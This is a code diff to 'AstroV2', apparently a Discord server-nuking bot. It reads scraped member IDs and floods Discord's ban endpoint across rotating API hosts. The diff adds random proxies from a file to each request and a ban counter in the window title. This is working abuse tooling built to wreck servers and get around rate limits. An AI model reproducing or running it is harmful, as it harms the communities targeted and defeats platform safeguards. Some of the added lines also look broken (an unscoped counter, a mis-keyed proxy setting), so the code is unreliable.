@@ -12,6 +12,7 @@ from requests_futures.sessions import FuturesSession
 intents = discord.Intents.all()
 intents.members = True
 client = commands.Bot(command_prefix = "astro!",case_insensitive = False,bot = True,intents=intents)
+amount = 0
 
 def slow_write(text):
     for x in text: print('' + x, end="");sys.stdout.flush();time.sleep(0.005)
@@ -83,7 +84,10 @@ class astro:
         try:
             while True:
                 req, url, headers = astro.q.get()
-                s = req(url, headers=headers).result()
+                p = open("proxies.txt", "r")
+                pr = p.readlines()
+                proxy = {"HTTP": f"http://{random.choice(pr)}"}
+                s = req(url, headers=headers, proxies=proxy).result()
                 astro.count += 1
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code}", 1))
                 if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
@@ -108,6 +112,8 @@ class astro:
         for member in open("scraped/scraped.txt"):
             ranapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}"]
             astro.q.put((astro.session.put, random.choice(ranapi), astro.headers))
+            amount += 1
+            os.system(f"title AstroV2 - Bans: {amount}")
         astro.q.join()
 
     @client.event
